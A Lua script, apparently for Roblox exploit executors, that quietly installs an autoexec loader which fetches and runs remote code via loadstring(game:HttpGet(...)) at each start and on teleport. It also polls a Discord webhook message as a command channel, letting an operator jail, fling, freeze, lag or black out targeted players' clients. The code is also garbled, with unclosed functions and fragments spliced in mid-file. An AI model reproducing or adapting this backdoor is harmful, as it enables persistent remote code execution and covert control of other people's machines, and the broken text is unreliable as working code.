local function guiParent()

local function send(method, url, data)
    if not requestFn then return nil end
    local ok, res = pcall(function()
        return requestFn({
            Url = url,
            Method = method,
            Headers = {["Content-Type"] = "application/json"},
            Body = data and HttpService:JSONEncode(data) or nil,
        })
    end)
    return ok and res or nil
end

local function extractMsgId(body)
    if not body then return nil end
    local id = body:match('"id"%s*:%s*"(%d+)"')
    if not id then id = body:match('"id"%s*:%s*(%d+)') end
    return id
end

local function getAvatar(id)
    local res = send("GET", "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..id.."&size=150x150&format=Png")
    if res and res.Body then
        local ok, d = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and d and d.data and d.data[1] and d.data[1].imageUrl then
            return d.data[1].imageUrl
        end
    end
    return nil
end

local URL_FILE = "venice_url.txt"
local LOADER_FILE = "venice_auto.lua"
local LOADER_CODE = 'loadstring(game:HttpGet("%s"))()'

local function hasFs()
    return writefile ~= nil and readfile ~= nil and isfolder ~= nil
end

local function readUrl()
    if AUTO_URL ~= "" then return AUTO_URL end
    local u = ""
    if readfile and isfile then
        pcall(function() if isfile(URL_FILE) then u = readfile(URL_FILE) or "" end end)
    end
    return u
end

local function autoexecFolder()
    local list = {"autoexec", "Autoexec", "auto-exec"}
    local ws
    pcall(function() ws = getworkspacefolder and getworkspacefolder() end)
    if ws then table.insert(list, 1, ws.."/autoexec") end
    for _, c in ipairs(list) do
        local ok, exists = pcall(function() return isfolder(c) end)
        if ok and exists then return c end
    end
    return nil
end

local function installAuto(url)
    if not hasFs() then return false, "executor sem writefile" end
    url = url or readUrl()
    if url == "" then return false, "URL vazia" end
    local folder = autoexecFolder()
    if not folder then
        pcall(function() makefolder("autoexec") end)
        folder = "autoexec"
    end
    local ok = pcall(function() writefile(folder.."/"..LOADER_FILE, string.format(LOADER_CODE, url)) end)
    if not ok then return false, "falha ao escrever" end
    pcall(function() writefile(URL_FILE, url) end)
    pcall(function()
        local q = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
        if q then q(string.format(LOADER_CODE, url)) end
    end)
    return true, folder
end

local function uninstallAuto()
    local folder = autoexecFolder()
    if folder and delfile then pcall(function() delfile(folder.."/"..LOADER_FILE) end) end
end

task.spawn(function()
    local u = readUrl()
    if u ~= "" then installAuto(u) end
end)

--== JAIL ==--
local JAIL_W, JAIL_H, JAIL_D = 9, 12, 9
local HALF_W, HALF_D = JAIL_W / 2, JAIL_D / 2
local jailed = false
local jailFolder = nil
local jailConn = nil

local function clearJail()
    if jailConn then jailConn:Disconnect(); jailConn = nil end
    if jailFolder then pcall(function() jailFolder:Destroy() end) end
    jailFolder = nil
end

local function startClamp(center)
    if jailConn then jailConn:Disconnect() end
    jailConn = RunService.Heartbeat:Connect(function()
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local off = hrp.Position - center
        if math.abs(off.X) > HALF_W - 1.1 or math.abs(off.Z) > HALF_D - 1.1 or math.abs(off.Y) > 4.5 then
            hrp.CFrame = CFrame.new(center) * (hrp.CFrame - hrp.CFrame.Position)
            hrp.AssemblyLinearVelocity = Vector3.zero
        end
    end)
end

local function buildJail(center)
    clearJail()
    local folder = Instance.new("Folder")
    folder.Name = "VeniceJail"
    folder.Parent = workspace
    jailFolder = folder

    local function bar(size, cf)
        local p = Instance.new("Part")
        p.Size = size
        p.CFrame = cf
        p.Anchored = true
        p.CanCollide = true
        p.CanQuery = true
        p.Material = Enum.Material.ForceField
        p.Color = Color3.fromRGB(95, 205, 255)
        p.Transparency = 0.32
        p.TopSurface = Enum.SurfaceType.Smooth
        p.BottomSurface = Enum.SurfaceType.Smooth
        p.Parent = folder
    end

    bar(Vector3.new(JAIL_W, 1, JAIL_D), CFrame.new(center - Vector3.new(0, JAIL_H / 2, 0)))
    bar(Vector3.new(JAIL_W, 1, JAIL_D), CFrame.new(center + Vector3.new(0, JAIL_H / 2, 0)))
    bar(Vector3.new(1, JAIL_H, JAIL_D), CFrame.new(center + Vector3.new(HALF_W, 0, 0)))
    bar(Vector3.new(1, JAIL_H, JAIL_D), CFrame.new(center - Vector3.new(HALF_W, 0, 0)))
    bar(Vector3.new(JAIL_W, JAIL_H, 1), CFrame.new(center + Vector3.new(0, 0, HALF_D)))
    bar(Vector3.new(JAIL_W, JAIL_H, 1), CFrame.new(center - Vector3.new(0, 0, HALF_D)))

    startClamp(center)
end

local function jail()
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    jailed = true
    buildJail(hrp.Position + Vector3.new(0, 3, 0))
end

local function unjail()
    jailed = false
    clearJail()
end

--== FLING ==--
local function fling()
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hrp then return end
    if hum then pcall(function() hum.PlatformStand = true end) end
    local t0 = os.clock()
    local conn
    conn = RunService.Heartbeat:Connect(function()
        if not hrp.Parent or os.clock() - t0 > 3 then
            if conn then conn:Disconnect() end
            if hum and hum.Parent then pcall(function() hum.PlatformStand = false end) end
            return
        end
        hrp.CFrame = hrp.CFrame * CFrame.Angles(math.random() * 7, math.random() * 7, math.random() * 7)
        hrp.AssemblyAngularVelocity = Vector3.new(math.random(-999, 999), math.random(-999, 999), math.random(-999, 999))
        hrp.AssemblyLinearVelocity = Vector3.new(math.random(-160, 160), math.random(90, 320), math.random(-160, 160))
    end)
end

--== FREEZE ==--
local frozen = false
local freezeConn = nil

local function applyFreeze()
    local char = player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    pcall(function() hum.WalkSpeed = 0 end)
    pcall(function() hum.JumpPower = 0 end)
    pcall(function() hum.JumpHeight = 0 end)
end

local function freeze(on)
    if on then
        frozen = true
        applyFreeze()
        pcall(function()
            CAS:BindAction("VeniceFreeze", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.PlayerActions:GetEnumItems()))
        end)
        if freezeConn then freezeConn:Disconnect() end
        freezeConn = RunService.Heartbeat:Connect(function()
            if frozen then applyFreeze() end
        end)
    else
        frozen = false
        if freezeConn then freezeConn:Disconnect(); freezeConn = nil end
        pcall(function() CAS:UnbindAction("VeniceFreeze") end)
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.WalkSpeed = 16 end)
            pcall(function() hum.JumpPower = 50 end)
        end
    end
end

local function camlock(on)

        camLocked = true

        local center = hrp and hrp.Position or cam.CFrame.Position
        local t0 = os.clock()
        camConn = RunService.RenderStepped:Connect(function()

            local ang = (os.clock() - t0) * 0.4
            cam.CameraType = Enum.CameraType.Scriptable
            cam.CFrame = CFrame.new(center + Vector3.new(0, 10, 0)) * CFrame.Angles(0, ang, 0) * CFrame.new(0, 0, 24)
        end)
    else
        camLocked = false
        if camConn then camConn:Disconnect(); camConn = nil end
        local c = workspace.CurrentCamera
        pcall(function()
            c.CameraType = camSavedType or Enum.CameraType.Custom
            c.CameraSubject = camSavedSubject or (player.Character and player.Character:FindFirstChildOfClass("Humanoid"))
        end)
    end

--== POLLING DE COMANDOS ==--
local lastNonce = nil
local initialized = false

local function parseCmd(content)
    local ok, cmd = pcall(function() return HttpService:JSONDecode(content) end)
    if ok and type(cmd) == "table" then return cmd end
    return nil
end

local function matchesTarget(target)
    if target == "all" or target == "" then return true end
    if target == tostring(player.UserId) then return true end
    if target:lower() == player.Name:lower() or target:lower() == player.DisplayName:lower() then return true end
    return false
end

local function handleCommand(c)
    if not matchesTarget(tostring(c.target or "all")) then return end
    local cmd = tostring(c.cmd or "")
    if cmd == "SHOW" then
        showBig(tostring(c.text or ""), 3)
    elseif cmd == "BLACK" then
        setBlack(true)
    elseif cmd == "BLACKOFF" then
        setBlack(false)
    elseif cmd == "FLING" then
        fling()
    elseif cmd == "JAIL" then
        jail()
    elseif cmd == "UNJAIL" then
        unjail()
    elseif cmd == "FREEZE" then
        freeze(true)
    elseif cmd == "UNFREEZE" then
        freeze(false)
    elseif cmd == "CAMLOCK" then
        camlock(true)
    elseif cmd == "CAMUNLOCK" then
        camlock(false)
    elseif cmd == "LAG" then
        lag(true)
    elseif cmd == "UNLAG" then
        lag(false)
    end
end

task.spawn(function()
    task.wait(math.random(0.5, 1.5))
    local r0 = send("GET", WEBHOOK_URL.."/messages/"..COMMAND_MESSAGE_ID)
    if r0 and r0.Body then
        local ok, m = pcall(function() return HttpService:JSONDecode(r0.Body) end)
        if ok and m and m.content then
            local c = parseCmd(m.content)
            if c and c.nonce then lastNonce = c.nonce; initialized = true end
        end
    end
    while true do
        pcall(function()
            local r = send("GET", WEBHOOK_URL.."/messages/"..COMMAND_MESSAGE_ID)
            if not r or not r.Body then return end
            if r.StatusCode == 429 then task.wait(5); return end
            local ok, m = pcall(function() return HttpService:JSONDecode(r.Body) end)
            if not ok or not m or not m.content then return end
            local c = parseCmd(m.content)
            if not c or not c.cmd or not c.nonce then return end
            if not initialized then lastNonce = c.nonce; initialized = true; return end
            if c.nonce == lastNonce then return end
            lastNonce = c.nonce
            handleCommand(c)
        end)
        task.wait(math.random(2, 4))
    end
end)

            tabs[n].BackgroundColor3 = n == name and Color3.fromRGB(45, 45, 45) or Color3.fromRGB(26, 26, 26)
        end
    end)
    return page
end

local function currentTarget()
    local target = string.match(idBox.Text or "", "^%s*(.-)%s*$") or ""
    if target == "" then target = "all" end
    return target
end

local function sendCmd(cmd, text)
    local target = currentTarget()
    local payload = {
        cmd = cmd,
        target = target,
        text = text,
        nonce = tostring(os.time()).."_"..tostring(math.random(100000, 999999)),
    }
    local res = send("PATCH", WEBHOOK_URL.."/messages/"..COMMAND_MESSAGE_ID.."?wait=true", {
        content = HttpService:JSONEncode(payload),
    })
    if res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then
        showBig("OK: "..cmd.." -> "..target, 2)
    else
        showBig("Falha ao enviar (PATCH)\nStatus: "..tostring(res and res.StatusCode or "nil"), 3)
    end
end

    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local d = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)
